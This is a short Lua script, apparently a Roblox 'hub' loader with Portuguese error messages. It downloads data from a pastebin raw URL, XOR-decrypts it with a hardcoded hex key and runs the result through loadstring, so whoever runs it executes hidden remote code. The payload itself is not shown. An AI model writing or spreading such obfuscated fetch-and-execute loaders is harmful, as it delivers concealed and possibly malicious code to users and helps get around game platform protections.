local url = "https://pastebin.com/raw/VVuVQdE4"
local hex_key = "302b3b702d25643e232a3374656f68282d2e6d6e7728247a57713a366c496243"

local function hex_to_string(hex)
    local str = ""
    for i = 1, #hex, 2 do
        str = str .. string.char(tonumber(string.sub(hex, i, i + 1), 16))
    end
    return str
end

local key = hex_to_string(hex_key)

local function get(u)
    local s,r = pcall(function()
        return game:HttpGet(u,true)
    end)
    if not s or not r or r == "" then
        error("Falha ao baixar hub")
    end
    return r
end

local function xor(d,k)
    local t={}
    for i=1,#d do
        local b=string.byte(d,i)
        local kb=string.byte(k,(i-1)%#k+1)
        t[i]=string.char(bit32.bxor(b,kb))
    end
    return table.concat(t)
end

local encrypted = get(url)
local decoded = xor(encrypted,key)

local func = loadstring(decoded)
if not func then
    error("Decode falhou")
end

func()
